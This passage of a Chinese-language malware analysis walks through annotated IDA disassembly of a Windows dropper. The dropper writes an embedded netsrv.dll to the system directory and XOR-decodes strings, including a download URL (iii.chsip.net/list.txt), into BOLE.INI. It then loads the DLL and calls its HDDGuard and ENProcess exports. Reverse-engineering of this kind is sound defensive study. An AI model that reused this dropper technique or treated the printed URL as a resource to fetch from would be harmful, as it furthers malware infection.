PS_____:00403A4C             call    CreateFileA       ; sysdirec\\netsrv.dll  
```

在系统目录中生成 `netsrv.dll`，

注意：此 `DLL` 文件的所有内容被嵌在 `EXE` 文件中，由 `EXE` 在运行过程中动态生成 `DLL` 是一种重要的方法。

众所周知，`WINDOWS` 提供的一些高级特性，如全局钩子，只有通过 `DLL` 才能完成。这种合二为一的方法

不但增强了隐蔽性，还会对 `IDA` 等分析工具的分析结果造成一定影响。

```asm
PS_____:00403A52             mov     esi, eax          ; file handle  
PS_____:00403A54             cmp     esi, 0FFFFFFFFh  
PS_____:00403A57             jz      short loc_403A77 ; if failed,jump  
PS_____:00403A59             lea     eax, [ebp+NumberOfBytesWritten_4]  
PS_____:00403A5C             push    ebx                 ; lpOverlapped  
PS_____:00403A5D             push    eax                 ; lpNumberOfBytesWritten  
PS_____:00403A5E             push    nNumberOfBytesToWrite ; nNumberOfBytesToWrite  
PS_____:00403A64             push    offset dword_402000 ; lpBuffer  
PS_____:00403A69             push    esi                 ; hFile  
PS_____:00403A6A             call    WriteFile         ; Write netsrv.dll  
PS_____:00403A70             push    esi                 ; hObject  
PS_____:00403A71             call    CloseHandle       ; Close handle of netsrv.dll  
PS_____:00403A77  
PS_____:00403A77 loc_403A77:                           ; CODE XREF: start+1C1 j  
PS_____:00403A77             call    CreateBOLE_INI  
```

又是一个新函数，不要担心， 我已经添加了足够的注释，而且它很简单：

```asm
PS_____:00403AE3 ; =============== S U B R O U T I N E =======================================  
PS_____:00403AE3  
PS_____:00403AE3 ; Attributes: bp-based frame  
PS_____:00403AE3  
PS_____:00403AE3 CreateBOLE_INI  proc near                ; CODE XREF: start:loc_403A77 p  
PS_____:00403AE3  
PS_____:00403AE3 String_554      = byte ptr -554h  
PS_____:00403AE3 var_553         = byte ptr -553h  
PS_____:00403AE3 FileName_154    = byte ptr -154h  
PS_____:00403AE3 var_153         = byte ptr -153h  
PS_____:00403AE3 var_50          = byte ptr -50h  
PS_____:00403AE3 var_4F          = byte ptr -4Fh  
PS_____:00403AE3 String1_10      = byte ptr -10h  
PS_____:00403AE3 var_F           = byte ptr -0Fh  
PS_____:00403AE3 NumberOfBytesWritten= dword ptr -4  
PS_____:00403AE3  
PS_____:00403AE3             push    ebp  
PS_____:00403AE4             mov     ebp, esp  
PS_____:00403AE6             sub     esp, 554h  
PS_____:00403AEC             push    ebx  
PS_____:00403AED             push    esi  
PS_____:00403AEE             push    edi  
PS_____:00403AEF             push    40h  
PS_____:00403AF1             xor     ebx, ebx          ; ebx==0  
PS_____:00403AF3             pop     ecx               ; 40  
PS_____:00403AF4             xor     eax, eax          ; eax==0  
PS_____:00403AF6             lea     edi, [ebp+var_153]  
PS_____:00403AFC             mov     [ebp+FileName_154], bl  
PS_____:00403B02             mov     [ebp+String_554], bl  
PS_____:00403B08             rep stosd  
PS_____:00403B0A             stosw  
```



```
PS_____:00403B0C                 stosb                   ; 103 was initialized with 0
PS_____:00403B0D                 mov     ecx, 0FFh       ; FF
PS_____:00403B12                 xor     eax, eax        ; EAX==0
PS_____:00403B14                 lea     edi, [ebp+var_553]
PS_____:00403B1A                 push    0Fh
PS_____:00403B1C                 rep stosd
PS_____:00403B1E                 stosw
PS_____:00403B20                 stosb                   ; 3FF bytes was initialized with 0
PS_____:00403B21                 pop     ecx             ; 0F
PS_____:00403B22                 xor     eax, eax        ; 0
PS_____:00403B24                 lea     edi, [ebp+var_4F]
PS_____:00403B27                 mov     [ebp+var_50], bl ; bl=0
PS_____:00403B2A                 rep stosd
PS_____:00403B2C                 stosw
PS_____:00403B2E                 stosb                   ; 3F bytes was initialized with 0
PS_____:00403B2F                 xor     eax, eax        ; 0
PS_____:00403B31                 lea     edi, [ebp+var_F]
PS_____:00403B34                 mov     [ebp+String1_10], bl ; bl=0
PS_____:00403B37                 mov     [ebp+NumberOfBytesWritten], ebx ; ebx==0
PS_____:00403B3A                 stosd
PS_____:00403B3B                 stosd
PS_____:00403B3C                 stosb                   ; 9 bytes were initialized with 0
PS_____:00403B3D                 mov     edi, 104h
PS_____:00403B42                 lea     eax, [ebp+FileName_154] ; Moudle file name
PS_____:00403B48                 push    edi             ; nSize   length of the char array
PS_____:00403B49                 push    eax             ; lpFilename
PS_____:00403B4A                 push    ebx             ; hModule
PS_____:00403B4B                 call    GetModuleFileNameA
PS_____:00403B51                 xor     ecx, ecx        ; 0
PS_____:00403B53                 cmp     dword_403618, ebx ; compare 4CH with 0
PS_____:00403B59                 jbe     short loc_403B7D

PS_____:00403B5B loc_403B5B:                  ; CODE XREF: CreateBOLE_INI+98 j
PS_____:00403B5B                 mov     eax, lpString2
PS_____:00403B60                 xor     byte ptr [eax+ecx], 25h
PS_____:00403B64                 add     eax, ecx        ; useless
PS_____:00403B66                 mov     eax, lpString2
PS_____:00403B6B                 add     eax, ecx
PS_____:00403B6D                 cmp     byte ptr [eax], 20h
PS_____:00403B70                 jnz     short loc_403B74
PS_____:00403B72                 mov     [eax], bl

PS_____:00403B74 loc_403B74:                  ; CODE XREF: CreateBOLE_INI+8D j
PS_____:00403B74                 inc     ecx
PS_____:00403B75                 cmp     ecx, dword_403618
PS_____:00403B7B                 jb      short loc_403B5B
```

以上代码段用于循环解密字符串，我以前的帖子对其做了详细的注释，故不再重复介绍。

```
PS_____:00403B7D loc_403B7D:                  ; CODE XREF: CreateBOLE_INI+76 j
PS_____:00403B7D                 push    lpString2       ; lpString2    "2008-2-3"
PS_____:00403B83                 mov     esi, lstrcpyA
PS_____:00403B89                 lea     eax, [ebp+String1_10] ;  "2008-2-3"
PS_____:00403B8C                 push    eax             ; lpString1
PS_____:00403B8D                 call    esi ; lstrcpyA
PS_____:00403B8F                 mov     eax, lpString2
PS_____:00403B94                 add     eax, 0Ch        ; pointer to second decoded string
PS_____:00403B97                 push    eax             ; lpString2
PS_____:00403B98                 lea     eax, [ebp+var_50] ; http://iii.chsip.net/list.txt
PS_____:00403B9B                 push    eax             ; lpString1
PS_____:00403B9C                 call    esi ; lstrcpyA
PS_____:00403B9E                 lea     eax, [ebp+FileName_154] ; system directory
PS_____:00403BA4                 push    edi             ; uSize
PS_____:00403BA5                 push    eax             ; lpBuffer
PS_____:00403BA6                 call    GetSystemDirectoryA
PS_____:00403BAC                 lea     eax, [ebp+FileName_154] ; system directory\BOLE.INI
PS_____:00403BB2                 push    offset String2  ; "\\BOLE.INI"
PS_____:00403BB7                 push    eax             ; lpString1
PS_____:00403BB8                 call    lstrcatA
PS_____:00403BBE                 push    ebx             ; hTemplateFile
PS_____:00403BBF                 push    ebx             ; dwFlagsAndAttributes
PS_____:00403BC0                 push    2               ; dwCreationDisposition
PS_____:00403BC2                 push    ebx             ; lpSecurityAttributes
PS_____:00403BC3                 push    ebx             ; dwShareMode
PS_____:00403BC4                 lea     eax, [ebp+FileName_154] ; system directory\BOLE.INI
PS_____:00403BCA                 push    2               ; dwDesiredAccess
PS_____:00403BCC                 push    eax             ; lpFileName
PS_____:00403BCD                 call    CreateFileA     ; Create BOLE.INI in system directory
```

在系统目录中生成 `BOLE.INI` 文件，并将解密出的字符串经格式化后写入其中，写入代码见下：

```
PS_____:00403BD3                 mov     esi, eax        ; File handle of BOLE.INI
PS_____:00403BD5                 lea     eax, [ebp+var_50]
PS_____:00403BD8                 push    eax
PS_____:00403BD9                 lea     eax, [ebp+String1_10]
PS_____:00403BDC                 push    eax
PS_____:00403BDD                 lea     eax, [ebp+String_554] ; Content of BOLE.INI
PS_____:00403BE3                 push    offset aUrlVersionSGet ; "[URL]\r\nVERSION=%s\r\nGET=%s"
PS_____:00403BE8                 push    eax             ; LPSTR
PS_____:00403BE9                 call    wsprintfA
PS_____:00403BEF                 add     esp, 10h        ; Revert the stack pointer
PS_____:00403BF2                 lea     eax, [ebp+NumberOfBytesWritten]
PS_____:00403BF5                 push    ebx             ; lpOverlapped
PS_____:00403BF6                 push    eax             ; lpNumberOfBytesWritten
PS_____:00403BF7                 lea     eax, [ebp+String_554]
PS_____:00403BFD                 push    eax             ; lpString
PS_____:00403BFE                 call    lstrlenA        ; Retrieve the length
PS_____:00403C04                 push    eax             ; nNumberOfBytesToWrite
PS_____:00403C05                 lea     eax, [ebp+String_554]
PS_____:00403C0B                 push    eax             ; lpBuffer
PS_____:00403C0C                 push    esi             ; hFile
PS_____:00403C0D                 call    WriteFile       ; Write BOLE.INI
PS_____:00403C13                 push    esi             ; hObject
PS_____:00403C14                 call    CloseHandle     ; Close handle of BOLE.INI
PS_____:00403C1A                 pop     edi
PS_____:00403C1B                 pop     esi
PS_____:00403C1C                 pop     ebx
```



### 函数结尾

```
PS_____:00403C1D                 leave               ; MOV ESP,EBP   POP EBP  

PS_____:00403C1E                 retn  

PS_____:00403C1E CreateBOLE_INI  endp  

PS_____:00403C1E  
```

`CreateBOLE_INI` 到此结束，我们继续：

### 加载 DLL 与获取函数地址

```
PS_____:00403A7C                 push    offset LibFileName ; "netsrv.dll"  

PS_____:00403A81                 call    LoadLibraryA    ; Load netsrv.dll  
```

注意：

将刚刚生成的 DLL 导入进程的地址空间，系统会在 `LoadLibrary()` 返回前调用 `netsrv.dll` 的 `DLLMAIN()` 传递参数 `DLL_PROCESS_ATTACH`，

关于 `LoadLibrary` 的详细信息，请参考 MSDN。

```
PS_____:00403A87                 mov     esi, GetProcAddress  

PS_____:00403A8D                 mov     edi, eax        ; module handle  

PS_____:00403A8F                 push    offset ProcName ; "HDDGuard"  

PS_____:00403A94                 push    edi             ; hModule  

PS_____:00403A95                 call    esi ; GetProcAddress  

PS_____:00403A97                 push    offset aEnprocess ; "ENProcess"  

PS_____:00403A9C                 push    edi             ; hModule  

PS_____:00403A9D                 mov     [ebp+var_8], eax ; Save fun address  

PS_____:00403AA0                 call    esi ; GetProcAddress  
```

以上代码用于获取 DLL 中被导出的 `HDDGuard()`, `ENProcess()` 函数地址

### 地址有效性检测

```
PS_____:00403AA2                 cmp     [ebp+var_8], ebx ; ebx==0  Addr of HDDGuard  

PS_____:00403AA5                 mov     [ebp+var_C], eax ; Addr of ENProcess  

PS_____:00403AA8                 jz      short loc_403ADA ; If GetProcAdd failed,jump,return  

PS_____:00403AAA                 cmp     eax, ebx  

PS_____:00403AAC                 jz      short loc_403ADA  
```

检测得到的地址是否有效

```
PS_____:00403AAE                 pusha               ; useless  

PS_____:00403AAF                 nop  

PS_____:00403AB0                 mov     eax, 3  

PS_____:00403AB5                 popa                ; over  
```

### 调用导出函数

以下代码调用 DLL 中被导出的函数

```
PS_____:00403AB6                 push    offset aTail_anti ; "TAIL_ANTI" ；；；“反跟踪”，字符串很牛  

PS_____:00403ABB                 call    [ebp+var_C]     ; ENProcess  

PS_____:00403ABE                 mov     esi, Sleep  

PS_____:00403AC4                 push    2710h           ; dwMilliseconds  

PS_____:00403AC9                 call    esi ; Sleep     ; call Sleep()  

PS_____:00403ACB                 call    [ebp+var_8]     ; HDDGuard()  

PS_____:00403ACE                 push    offset aTail_jqg ; "TAIL_JQG"  

PS_____:00403AD3                 call    [ebp+var_C]     ; ENProcess()  

PS_____:00403AD6                 push    0FFFFFFFFh      ; dwMilliseconds  

PS_____:00403AD8                 call    esi ; Sleep  
```

### 清理与返回

```
PS_____:00403ADA  

PS_____:00403ADA loc_403ADA:                           ; CODE XREF: start+162 j  

PS_____:00403ADA                                       ; start+173 j ...  

PS_____:00403ADA                 pop     edi  

PS_____:00403ADB                 pop     esi  

PS_____:00403ADC                 xor     eax, eax  

PS_____:00403ADE                 pop     ebx  

PS_____:00403ADF                 leave  

PS_____:00403AE0                 retn    10h  

PS_____:00403AE0 start           endp  

PS_____:00403AE0  

PS_____:00403AE3  
```

篇幅较长，希望读者可以耐心看完，Good Luck！
